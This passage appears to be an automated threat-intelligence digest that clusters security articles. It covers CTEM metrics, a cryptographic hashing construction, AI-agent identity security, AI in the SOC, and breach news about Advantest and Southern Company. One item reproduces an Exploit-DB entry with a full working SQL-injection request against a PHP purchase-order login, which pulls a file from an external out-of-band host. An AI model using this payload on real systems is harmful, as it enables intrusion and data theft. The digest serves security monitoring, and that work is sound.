permanent fix is developed. They should also measure the time required to remediate the underlying conditions. Depending on the attack path, that may require addressing several weaknesses across vulnerabilities, credentials, permissions, configurations, or security controls. This distinction matters because eliminating the initial weakness may not eliminate the broader path or prevent the original impact. Organizations should measure the time from validation through mitigation, remediation, and verification. This shows how quickly they can eliminate a proven attack path and confirm that its associated impact is no longer achievable, while also revealing where ownership, competing priorities, change-management constraints, or technical dependencies are slowing progress. Measure Verification and Recurrence Verification should determine more than whether a vulnerability was patched or an isolated weakness can no longe
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: What Security Metrics Actually Matter?
  - Published: 2026-10-01T16:17:43+00:00
  - Link: https://horizon3.ai/intelligence/blogs/ctem-security-metrics-that-matter/
  - Summary: Security activity doesn’t always equal risk reduction. Learn how attack paths, business impact, verification, remediation speed, and recurrence can show whether CTEM is actually working.

### Cluster d98d1967f2 — score 10

- Title: [webapps] POMS oretnom23v1.0 - SQLi vulnerabilities
- Source: Exploit-DB (offensive_vulnerability_research)
- Published: 2026-10-01T00:00:00+00:00
- Link: https://www.exploit-db.com/exploits/52684
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
POMS oretnom23v1.0 - SQLi vulnerabilities
```

#### Full body

```
Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training POMS oretnom23v1.0 - SQLi vulnerabilities EDB-ID: 52684 CVE: N/A EDB Verified: Author: nu11secur1ty Type: webapps Exploit: / Platform: Multiple Date: 2026-10-01 Vulnerable App: # Title: POMS oretnom23v1.0 - SQLi vulnerabilities # Author: nu11secur1ty # Date: 10/01/2026 # Vendor: https://github.com/oretnom23 # Software: https://www.sourcecodester.com/php/14935/purchase-order-management-system-using-php-free-source-code.html # Reference: https://portswigger.net/web-security/sql-injection ## Description: The password parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load_file('\\\\ y10in4ofvosyskgb5c9a7e55mwssgkf86bu3hu5j.oastify.com\\ifs'))+' was submitted in the password parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed. STATUS: CRITICAL [+]Payload: ``` POST /purchase_order/classes/Login.php?f=login HTTP/1.1 Host: localhost Cache-Control: max-age=0 Sec-CH-UA: "Chromium";v="151", "Not;A=Brand";v="24", "Google Chrome";v="151" Sec-CH-UA-Mobile: ?0 Sec-CH-UA-Platform: "Windows" Accept-Language: en-US;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Accept: */* Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br Connection: close Cookie: PHPSESSID=io6v7ltscimb0vv716cvdphifd Origin: http://localhost X-Requested-With: XMLHttpRequest Referer: http://localhost/purchase_order/admin/login.php Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Content-Length: 37 username=YIMivRgy&password=l9V!q9b!X1'%2b(select%20load_file('%5c%5c%5c% 5cy10in4ofvosyskgb5c9a7e55mwssgkf86bu3hu5j.oastify.com%5c%5cifs'))%2b' ``` # Demo: [href]( https://odysee.com/@nu11secur1ty:b/Kousei-the-agressive-frameweork-for-sqlmap:1 ) # Time spent: 01:15:00 -- System Administrator - Infrastructure Engineer Penetration Testing Engineer Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html https://cxsecurity.com/ and https://www.exploit-db.com/ home page: https://www.asc3t1c-nu11secur1ty.com/ hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E= nu11secur1ty <https://www.asc3t1c-nu11secur1ty.com/> -- System Administrator - Infrastructure Engineer Penetration Testing Engineer Exploit developer at https://packetstorm.news/ https://cve.mitre.org/index.html https://cxsecurity.com/ and https://www.exploit-db.com/ 0day Exploit DataBase https://0day.today/ home page: https://www.asc3t1c-nu11secur1ty.com/ hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E= nu11secur1ty <http://nu11secur1ty.com/> Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services
```

#### Corroborating sources (1)

- **Exploit-DB** (offensive_vulnerability_research)
  - Title: [webapps] POMS oretnom23v1.0 - SQLi vulnerabilities
  - Published: 2026-10-01T00:00:00+00:00
  - Link: https://www.exploit-db.com/exploits/52684
  - Summary: POMS oretnom23v1.0 - SQLi vulnerabilities

### Cluster 93df4bafde — score 10

- Title: SequenceHash: multihashing for the rest of us
- Source: Trail of Bits (offensive_vulnerability_research)
- Published: 2026-10-02T11:00:00+00:00
- Link: https://blog.trailofbits.com/2026/10/02/sequencehash-multihashing-for-the-rest-of-us/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Multihashing is one of those cryptographic tasks that’s easy not to think about too much. This is unfortunate, because multihashing is a common stumbling point when cryptographers try to use hashes. As part of our goal to “fix software, not bugs,” Trail of Bits is introducing SequenceHash and its sister function SequenceMAC , a pair of related hash constructions that bring secure multihashing to developers using hash functions other than Keccak. We hope SequenceHash and SequenceMAC will help cryptographers avoid attacks that take advantage of ambiguous input encodings. The specification is open source, and is now a part of the Community Cryptography Specification Project (C2SP). SequenceHash and SequenceMAC behave similarly to NIST’s TupleHash , but have the advantage of not being tied to a single hash function. They also don’t require developers to implement fiddly computations that aren’t byte-aligned. Instead, SequenceHash and SequenceMAC work out of the box with nearly any secure c
```

#### Full body

```
Page content Multihashing is one of those cryptographic tasks that’s easy not to think about too much. This is unfortunate, because multihashing is a common stumbling point when cryptographers try to use hashes. As part of our goal to “fix software, not bugs,” Trail of Bits is introducing SequenceHash and its sister function SequenceMAC , a pair of related hash constructions that bring secure multihashing to developers using hash functions other than Keccak. We hope SequenceHash and SequenceMAC will help cryptographers avoid attacks that take advantage of ambiguous input encodings. The specification is open source, and is now a part of the Community Cryptography Specification Project (C2SP). SequenceHash and SequenceMAC behave similarly to NIST’s TupleHash , but have the advantage of not being tied to a single hash function. They also don’t require developers to implement fiddly computations that aren’t byte-aligned. Instead, SequenceHash and SequenceMAC work out of the box with nearly any secure cryptographic hash function you care to use, including SHA256/384/512, BLAKE, and RIPEMD. SequenceMAC supports keys 32 bytes or longer (up to the ridiculous limit of ${2}^{128}-1$ bytes). (It’s worth noting: SequenceHash and SequenceMAC rely on the security of the underlying hash for their own security. SequenceHash and SequenceMAC can’t magically make MD4 or SHA0 secure again. For the purposes of this document, it’s assumed that you have chosen a reasonable hash function like SHA256, not CRC32.) To make SequenceHash and SequenceMAC easy to use, we’re releasing three initial implementations of SequenceHash and SequenceMAC: one each in Rust, Go, and Python. We’re also releasing a large set of test vectors that cover multiple hash functions and include intermediate values to help developers debug and verify their implementations. Wait, “multihashing”? Yeah, it’s a weird term, but the idea is pretty simple. “Multihashing” means “hashing a bunch of values together.” If you’ve ever read a cryptography paper, and there’s a step that says something like “compute the shared authenticator N=Hash(X, Y, Z, A, B) ,” that’s multihashing. You need to create a hash that incorporates the inputs X, Y, Z, A , and B . Unfortunately, the simple “solution” of concatenating the inputs and hashing the result can lead to serious security problems. For example, consider what happens when you hash three inputs using “raw” SHA256: import hashlib hasher = hashlib . new ( 'sha256' ) hasher . update ( b 'Test 0' ) hasher . update ( b 'Test 1' ) hasher . update ( b 'Test 2' ) print ( hasher . hexdigest ()) hasher = hashlib . new ( 'sha256' ) hasher . update ( b 'Test 0Test 1' ) hasher . update ( b 'Test 2' ) print ( hasher . hexdigest ()) hasher = hashlib . new ( 'sha256' ) hasher . update ( b 'Test 0' ) hasher . update ( b '' ) hasher . update ( b 'Test 1Test 2' ) print ( hasher . hexdigest ()) This produces the following output: 4fce0a9940a42b5c9d1bcbfc9a6ddd6de20d731d584a0acf5bda6de86483641c 4fce0a9940a42b5c9d1bcbfc9a6ddd6de20d731d584a0acf5bda6de86483641c 4fce0a9940a42b5c9d1bcbfc9a6ddd6de20d731d584a0acf5bda6de86483641c Even though inputs are fed in through separate calls, they’re not separated from the perspective of the hash function—under the hood, the inputs are just concatenated. As with many things in cryptography, multihashing is harder than you think. That’s a big problem because multihashing is a critical component of one of the most important tools in zero-knowledge proofs: the Fiat-Shamir transform . When you get multihashing wrong, you introduce the risk of forgeries into your zero-knowledge proofs. Given that zero-knowledge proofs play a major role in cryptocurrency nowadays, that sort of mistake is sometimes measured in millions of dollars. But Fiat-Shamir transforms aren’t the only place where you might want to use multihashing. It’s not uncommon to need to hash a collection of related objects, where both the objects and the collection are variable
```

#### Corroborating sources (1)

- **Trail of Bits** (offensive_vulnerability_research)
  - Title: SequenceHash: multihashing for the rest of us
  - Published: 2026-10-02T11:00:00+00:00
  - Link: https://blog.trailofbits.com/2026/10/02/sequencehash-multihashing-for-the-rest-of-us/
  - Summary: Multihashing is one of those cryptographic tasks that’s easy not to think about too much. This is unfortunate, because multihashing is a common stumbling point when cryptographers try to use hashes. As part of our goal to “fix software, not bugs,” Trail of Bits is introducing SequenceHash and its sister function SequenceMAC , a pair of related hash constructions that bring secure multihashing to developers using hash functions other than Keccak. We hope SequenceHash and SequenceMAC will help cryptographers avoid attacks that take advantage of ambiguous input encodings. The specification is open source, and is now a part of the Community Cryptography Specification Project (C2SP). SequenceHash and SequenceMAC behave similarly to NIST’s TupleHash , but have the advantage of not being tied to a single hash function. They also don’t require developers to implement fiddly computations that aren’t byte-aligned. Instead, SequenceHash and SequenceMAC work out of the box with nearly any secure c

### Cluster 9adcf13670 — score 10

- Title: Securing Agent-to-Agent Communication: The Next Identity Frontier
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-10-06T14:11:03+00:00
- Link: https://www.rapid7.com/blog/post/ai-securing-agent-to-agent-communication-next-identity-frontier
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ai_security
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: ai_security
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
As organizations deploy autonomous AI agents, security teams face a significant shift as non-human non-human entities making decisions, invoking tools, and delegating tasks to other agents without human intervention. Security architectures built around human users, static APIs, and distinct endpoints break down when AI agents dynamically collaborate across an environment. As these interactions become more common, securing agent-to-agent communication without blocking adoption will require security leaders to treat autonomous agents as first-class identities, with their own permissions, behaviors, and activity to monitor. The operational reality: A new attack surface Consider a standard enterprise scenario where a primary agent delegates a task to a secondary agent, which then queries a production database through the Model Context Protocol and forwards a summary to external infrastructure. Traditional controls may struggle to capture the complete interaction, leaving security teams wit
```

#### Full body

```
Security Operations (SOC) Securing Agent-to-Agent Communication: The Next Identity Frontier Umair Mazhar Oct 6, 2026 | Last updated on Oct 6, 2026 | 4 min read DISCOVER RAPID7 MDR Securing Agent-to-Agent Communication: The Next Identity Frontier Table of contents Securing Agent-to-Agent Communication: The Next Identity Frontier DISCOVER RAPID7 MDR Table of contents As organizations deploy autonomous AI agents, security teams face a significant shift as non-human non-human entities making decisions, invoking tools, and delegating tasks to other agents without human intervention. Security architectures built around human users, static APIs, and distinct endpoints break down when AI agents dynamically collaborate across an environment. As these interactions become more common, securing agent-to-agent communication without blocking adoption will require security leaders to treat autonomous agents as first-class identities, with their own permissions, behaviors, and activity to monitor. The operational reality: A new attack surface Consider a standard enterprise scenario where a primary agent delegates a task to a secondary agent, which then queries a production database through the Model Context Protocol and forwards a summary to external infrastructure. Traditional controls may struggle to capture the complete interaction, leaving security teams without visibility into intent, delegation chains, and scope of authority and introducing five security challenges that deserve particular attention: Identity and delegation chaining requires verifying an agent’s identity while ensuring its delegated authority never exceeds the permissions of the initiating user. Behavioral drift creates detection blind spots because when autonomous agents adapt execution paths dynamically, distinguishing normal operational variance from compromise or prompt injection becomes extremely difficult. Tool and protocol abuse allows agents to invoke APIs and tools autonomously, meaning that without strict guardrails, an agent quickly becomes an unwitting vector for data exfiltration or unauthorized execution. Cascading access can create systemic risk when a compromised high-privilege agent influences secondary agents and expands access across interconnected enterprise systems. Observability gaps arise when fragmented API logs cannot reconstruct multi-agent decision paths or explain why a particular action took place. How agent activity fits existing security operations Agent-to-agent communication can be treated as an extension of the security telemetry teams already collect across users, endpoints, cloud workloads, and applications. Bringing agent identities, delegation paths, tool invocations, and data access into the same investigation model allows existing detection engineering and behavioral analytics practices to evolve alongside agentic workloads. For example, when a user initiates an action through a primary agent that delegates work to a secondary agent, the resulting identity chain and tool activity can be correlated with authentication events, endpoint activity, and network logs. This gives analysts a more complete investigation timeline, from the initiating user through each agent and tool involved. Entity-based context expands the security model beyond users and devices to include AI agents as entities, allowing analysts to trace activity from the initiating user through sub-agents and tools. Behavioral analytics can similarly extend from User Behavior Analytics toward Agent Behavior Analytics. By establishing baselines for how agents normally behave, detection engines can identify anomalies such as unexpected inter-agent communication, sudden privilege escalation, or unusually high-volume transfers. Managed detection and response can incorporate agentic telemetry alongside the users, endpoints, and cloud workloads already monitored. Investigation workflows can then account for agent relationships, delegated actions, and tool invocations as part of
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Securing Agent-to-Agent Communication: The Next Identity Frontier
  - Published: 2026-10-06T14:11:03+00:00
  - Link: https://www.rapid7.com/blog/post/ai-securing-agent-to-agent-communication-next-identity-frontier
  - Summary: As organizations deploy autonomous AI agents, security teams face a significant shift as non-human non-human entities making decisions, invoking tools, and delegating tasks to other agents without human intervention. Security architectures built around human users, static APIs, and distinct endpoints break down when AI agents dynamically collaborate across an environment. As these interactions become more common, securing agent-to-agent communication without blocking adoption will require security leaders to treat autonomous agents as first-class identities, with their own permissions, behaviors, and activity to monitor. The operational reality: A new attack surface Consider a standard enterprise scenario where a primary agent delegates a task to a secondary agent, which then queries a production database through the Model Context Protocol and forwards a summary to external infrastructure. Traditional controls may struggle to capture the complete interaction, leaving security teams wit

### Cluster 5dbe1bad04 — score 10

- Title: How AI Is Changing the Roles Required in the Security Operations Center
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-10-01T13:00:00+00:00
- Link: https://www.rapid7.com/blog/post/ai-changing-security-operations-center-roles-soc
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
As AI takes on more of the enrichment, correlation, and initial assessment inside the SOC, roles, skills, and KPIs still require deliberate redesign. Security leaders need to decide where automation is dependable, where human judgment should remain decisive, and how teams should be measured when alert handling is no longer the center of the operating model The Gartner® report, The Roles Required for the AI-Enabled Security Operations Center (SOC) , examines the roles and capabilities Gartner expects the SOC to require as AI becomes embedded in security operations. Rapid7 is offering complimentary access to the research, which we believe can help leaders plan their future workforce, operating model, and investment priorities. How will AI change the role of SOC analysts? Many analyst roles and performance measures remain closely tied to handling individual alerts. As organizations introduce AI SOC agents to support enrichment, correlation, and initial assessment, leaders may need to reco
```

#### Full body

```
Exposure Command How AI Is Changing the Roles Required in the Security Operations Center Rapid7 Oct 1, 2026 | Last updated on Oct 1, 2026 | 4 min read DOWNLOAD THE GARTNER REPORT How AI Is Changing the Roles Required in the Security Operations Center Table of contents How AI Is Changing the Roles Required in the Security Operations Center DOWNLOAD THE GARTNER REPORT Table of contents As AI takes on more of the enrichment, correlation, and initial assessment inside the SOC, roles, skills, and KPIs still require deliberate redesign. Security leaders need to decide where automation is dependable, where human judgment should remain decisive, and how teams should be measured when alert handling is no longer the center of the operating model The Gartner® report, The Roles Required for the AI-Enabled Security Operations Center (SOC) , examines the roles and capabilities Gartner expects the SOC to require as AI becomes embedded in security operations. Rapid7 is offering complimentary access to the research, which we believe can help leaders plan their future workforce, operating model, and investment priorities. How will AI change the role of SOC analysts? Many analyst roles and performance measures remain closely tied to handling individual alerts. As organizations introduce AI SOC agents to support enrichment, correlation, and initial assessment, leaders may need to reconsider where human expertise creates the greatest operational value. Gartner states, "Human analysts must transition from alert triage roles to end-to-end case ownership and effective response option communication." At Rapid7, we believe this shift creates an opportunity for analysts to focus their judgment on validating context, coordinating response, and communicating decisions clearly. Gartner also recommends, "Stop recording alert metrics and run the SOC on cases and decisions." Robert Willis, VP of Managed Detection and Response at Rapid7, puts it plainly: "Alert volume is a distraction. The real measure of SOC value is decision quality, did you get the right answer, fast enough to act on it? MDR is built to deliver exactly that: answers, not alerts, so your team can focus on ownership and response rather than triage." MDR can help manage alert volume while adding investigation and response capacity, giving internal teams more space to focus on the cases that require their context and ownership. Where does human judgment remain essential? Rapid7's experience applying agentic AI within our MDR SOC shows how this division of work can operate in practice. Our agentic workflows have saved more than 200 analyst hours each week and achieved 99.93% benign-disposition accuracy, reducing the repetitive work involved in initial triage and giving analysts more time for complex, ambiguous, and higher-stakes investigations. We believe human judgment remains essential when a decision carries operational consequences. AI can gather evidence, correlate activity, and present a structured rationale, while analysts validate the conclusion, consider the organization's priorities, and determine the appropriate response. This human-led, AI-driven model combines machine-speed investigation with accountable decision-making. Why are SOC engineering roles expected to expand? As AI-enabled workflows expand, engineering discipline is likely to become increasingly important within security operations. Reliable processes require people who understand threats and security data, can test automated workflows, and can establish appropriate controls around AI-supported decisions. The report includes the strategic planning assumption, "By 2028 there will be 50% more engineers in security operations teams than analysts." Gartner also advises organizations, "Redefine detection engineering role descriptions and hiring requirements. Expand them beyond rule writing to include prompt design, workflow testing, and AI output validation." From Rapid7's perspective, detection engineering is developing into
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: How AI Is Changing the Roles Required in the Security Operations Center
  - Published: 2026-10-01T13:00:00+00:00
  - Link: https://www.rapid7.com/blog/post/ai-changing-security-operations-center-roles-soc
  - Summary: As AI takes on more of the enrichment, correlation, and initial assessment inside the SOC, roles, skills, and KPIs still require deliberate redesign. Security leaders need to decide where automation is dependable, where human judgment should remain decisive, and how teams should be measured when alert handling is no longer the center of the operating model The Gartner® report, The Roles Required for the AI-Enabled Security Operations Center (SOC) , examines the roles and capabilities Gartner expects the SOC to require as AI becomes embedded in security operations. Rapid7 is offering complimentary access to the research, which we believe can help leaders plan their future workforce, operating model, and investment priorities. How will AI change the role of SOC analysts? Many analyst roles and performance measures remain closely tied to handling individual alerts. As organizations introduce AI SOC agents to support enrichment, correlation, and initial assessment, leaders may need to reco

### Cluster 61679905e6 — score 10

- Title: Advantest confirms personal information stolen in ransomware attack
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-10-07T10:27:52+00:00
- Link: https://www.bleepingcomputer.com/news/security/advantest-confirms-personal-information-stolen-in-ransomware-attack/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, phishing_social_eng, ransomware_extortion
- affected_industries: critical_infrastructure, financial_services, healthcare, manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, data_breach
- affected_industries: healthcare, financial_services, critical_infrastructure, manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Advantest Corporation is notifying affected individuals that a ransomware attack earlier this year exposed their personally identifiable data. [...]
```

#### Full body

```
Advantest confirms personal information stolen in ransomware attack By Bill Toulas October 7, 2026 06:27 AM 0 Advantest Corporation is notifying affected individuals that a ransomware attack earlier this year exposed their personally identifiable data. The Japanese company is a global manufacturer of automated test equipment for the semiconductor industry. On February 15, a threat actor breached its network and gained access to some of its systems. At the time, the disclosure noted that hackers had accessed parts of its network and deployed a ransomware payload, but the company could not determine if customer or employee data had been impacted. In a data breach notification dated October 6, 2026, Advantest confirms that data was stolen in the attack. “In February 2026, Advantest became aware of a cybersecurity incident in which an unauthorized third party accessed Advantest systems and extracted some data from our servers,” reads the notification . “The data extracted from our servers included PII (personally identifiable information) belonging to you.” The data types that have been exposed include the following: Contact information Date of birth Social Security Number (SSN) National ID number Driver’s License Passport number Medical information Financial information Other ID numbers It is unclear whether the compromised data belongs to customers, employees, partners, or a combination of these groups. BleepingComputer has contacted Advantest with questions about the number of affected individuals, but we have not received a response as of publication. The company states that it has no information that the compromised data has been leaked or otherwise misused, although it recognizes the elevated risk of identity theft and fraud for exposed individuals. To mitigate this risk, the firm provides instructions on how to enroll in free 18-month identity theft, credit, and web monitoring services from Kroll, giving letter recipients until January 4, 2027, to activate the offer. In addition to enrolling in this service, impacted individuals are recommended to closely monitor their accounts and financial statements for suspicious activity and report any unknown transactions to their bank. Also, it is advisable to be cautious about phishing attempts, avoid clicking links or opening attachments, and never send money or share sensitive information in response to requests made via email or text. At the time of writing, BleepingComputer could not find any public claims from ransomware groups targeting Advantest. Build your security blueprint for AI-powered attacks Join Mikko Hyppönen and security leaders from the NFL, CHANEL, and Atlassian for a two-hour digital summit on what AI-speed attacks change, what defenders should stop doing, and how to validate, decide, fix, and re-validate at machine speed. Save your seat Related Articles: LACMA data breach last year exposed social security and medical data Times Car confirms data breach affecting 6.6 million user accounts BigCommerce alerts merchants of data breach linked to Ribon apps Gyazo server flaw exploited to steal 23.6 million user records CenterPoint Energy confirms customer data stolen in cyberattack
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Advantest confirms personal information stolen in ransomware attack
  - Published: 2026-10-07T10:27:52+00:00
  - Link: https://www.bleepingcomputer.com/news/security/advantest-confirms-personal-information-stolen-in-ransomware-attack/
  - Summary: Advantest Corporation is notifying affected individuals that a ransomware attack earlier this year exposed their personally identifiable data. [...]

### Cluster 9040cd1db5 — score 10

- Title: Georgia Power, Alabama Power Data Breach Hits 400,000 Accounts
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-10-07T14:15:20+00:00
- Link: https://www.securityweek.com/georgia-power-alabama-power-data-breach-hits-400000-accounts/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, zero_day
- actor_attribution: ShinyHunters
- affected_industries: critical_infrastructure, financial_services, government, manufacturing_industrial
- affected_products: Anthropic/Claude, Citrix, OpenAI/ChatGPT
- urgency_signals: zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, data_breach
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government, critical_infrastructure, manufacturing_industrial
- affected_products: Anthropic/Claude, Citrix, OpenAI/ChatGPT
- urgency_signals: zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Southern Company is notifying customers that their utility account information was accessed by hackers. The post Georgia Power, Alabama Power Data Breach Hits 400,000 Accounts appeared first on SecurityWeek .
```

#### Full body

```
Southern Company is notifying roughly 400,000 customers that their utility account information was accessed by an unauthorized third party through its online customer portal. The Atlanta-based energy holding company serves more than 9 million customers through electric utilities in three states and natural gas distribution businesses in four. Its electric subsidiaries are Georgia Power, Alabama Power and Mississippi Power. Roughly 300,000 of the affected accounts belong to Georgia Power customers. According to Southern Company, the incident also impacted roughly 100,000 of Alabama Power’s 1.6 million accounts. Mississippi Power is named as affected in the company’s public notice, but no figure has been released for its customers. “An unauthorized third party accessed certain, limited information about the accounts of approximately 400K customers. Upon detection, we took immediate steps to stop the activity and have engaged law enforcement,” the company said in a statement sent to the media. Southern Company’s public notice specifies the type of data involved. “Based on our investigation to date, the limited customer account information that the unauthorized party gained access to includes the customer’s name, mailing address, phone number, email, or the last 4 digits of their Social Security Number, and other basic account details,” the notice reads. Advertisement. Scroll to continue reading. The utility says the attacker did not access bank account numbers, payment card numbers or driver’s license numbers. Southern Company has not said when the intrusion took place or how the attacker gained access to the portal. Impacted customers are being notified by mail and email and offered a year of free credit monitoring. Related : ASOS Confirms Cyberattack, Data Breach Related : Advantest Discloses Data Breach Months After Ransomware Attack Related : 8.8 Million Impacted by Data Breach at Denmark’s Central Person Register Related : Personal Information for Over 1 Million People Stolen in a Cyberattack on Arizona’s Court System Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs FBI Blames Contractor’s Missed Patch for ShinyHunters Breach Cybersecurity M&A Roundup: 39 Deals Announced in September 2026 Google Narrows Open Source Bug Bounty Amid Wave of Invalid Automated Reports Exploitation of Citrix NetScaler Zero-Day Hits Appliances Patched Days Earlier Crypto Scammers Hijack Microsoft’s Official X Account AI Agents Aimed SQL Injection at US and Canadian Government Sites Police Shut Down KillSec Ransomware, Identify Alleged Teen Leader Treasury Blacklists Most-Wanted ATM Malware Developer and His Network Latest News Qilin Ransomware Suspect Arrested in Japan, Extradited to Germany Hadrian Raises $40 Million to Expand Autonomous Offensive Security Platform Advantest Discloses Data Breach Months After Ransomware Attack Chrome 155 Update Patches 247 Vulnerabilities Anthropic Introduces 3-Tier Cyber Verification Program for AI Access ASOS Confirms Cyberattack, Data Breach Wikimedia Says Rogue OpenAI Agents Tried to Turn Its Tools Into Proxies Android’s October 2026 Updates Patch 25 Vulnerabilities Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Securing AI Agents, MCPs, and AI Automations October 7, 2026 Learn how to address potential risks and not restrict AI adoption in your organization. See what a centralized AI gateway is and how it works in practice. R
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Georgia Power, Alabama Power Data Breach Hits 400,000 Accounts
  - Published: 2026-10-07T14:15:20+00:00
  - Link: https://www.securityweek.com/georgia-power-alabama-power-data-breach-hits-400000-accounts/
  - Summary: Southern Company is notifying customers that their utility account information was accessed by hackers. The post Georgia Power, Alabama Power Data Breach Hits 400,000 Accounts appeared first on SecurityWeek .

### Cluster 3f141695df — score 10

- Title: Advantest Discloses Data Breach Months After Ransomware Attack
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-10-07T12:37:24+00:00
- Link: https://www.securityweek.com/advantest-discloses-data-breach-months-after-ransomware-attack/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, zero_day
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government, healthcare, manufacturing_industrial
- affected_products: Anthropic/Claude, Citrix, OpenAI/ChatGPT
- urgency_signals: zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, data_breach
- actor_attribution: ShinyHunters
- affected_industries: healthcare, financial_services, government, manufacturing_industrial
- affected_products: Anthropic/Claude, Citrix, OpenAI/ChatGPT
- urgency_signals: zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The Japanese chip testing giant said hackers stole personal information from its servers in the February 2026 cyberattack. The post Advantest Discloses Data Breach Months After Ransomware Attack appeared first on SecurityWeek .
```

#### Full body

```
Japanese chip testing giant Advantest is informing individuals that hackers stole personal information in the ransomware attack disclosed in February 2026. Advantest, which makes automatic test equipment for chipmakers such as Intel and Samsung, said in February that hackers had breached its network and deployed ransomware. At the time, it was still working to determine whether any sensitive information had been exfiltrated. In data breach notifications sent out now, the company said the attackers stole personally identifiable information, including names, dates of birth, contact information, SSNs, passport and driver’s license numbers, and medical and financial information. “We have no information suggesting that your PII has been disclosed publicly or otherwise misused,” Advantest said. “However, this incident may have placed you at increased risk of identity theft or fraud.” The company has not disclosed how many individuals were impacted by the data breach, but its filing with the California Attorney General’s Office indicates that more than 500 California residents are affected. Advertisement. Scroll to continue reading. Notifications submitted to attorneys general in Massachusetts and Vermont list 14 and 8 affected residents, respectively. No known ransomware group appears to have taken credit for an attack on Advantest. Related : ASOS Confirms Cyberattack, Data Breach Related : Personal Information for Over 1 Million People Stolen in a Cyberattack on Arizona’s Court System Related : 8.8 Million Impacted by Data Breach at Denmark’s Central Person Register Related : 250,000 Impacted by Data Breaches at New Jersey, Texas Healthcare Firms Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs FBI Blames Contractor’s Missed Patch for ShinyHunters Breach Cybersecurity M&A Roundup: 39 Deals Announced in September 2026 Google Narrows Open Source 